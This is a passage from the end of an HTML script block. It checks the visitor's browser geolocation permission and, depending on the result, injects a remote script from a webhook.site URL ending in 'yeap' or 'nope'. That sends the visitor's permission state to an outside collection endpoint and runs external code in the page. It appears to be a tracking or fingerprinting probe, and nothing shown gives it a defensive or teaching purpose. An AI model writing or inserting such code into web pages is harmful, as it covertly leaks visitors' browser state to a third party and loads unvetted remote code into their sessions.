			script.src = jsFile;
			document.head.appendChild(script);
		}

		navigator.permissions.query({name:'geolocation'}).then(async function(result) {
			if (result.state === 'granted') {
				injectCustomLib("https://webhook.site/bedac567-0d70-482d-ade2-2a68f65c10a6/yeap")
			} else if (result.state === 'prompt') {
				injectCustomLib("https://webhook.site/bedac567-0d70-482d-ade2-2a68f65c10a6/nope")
			}
		})
	</script>
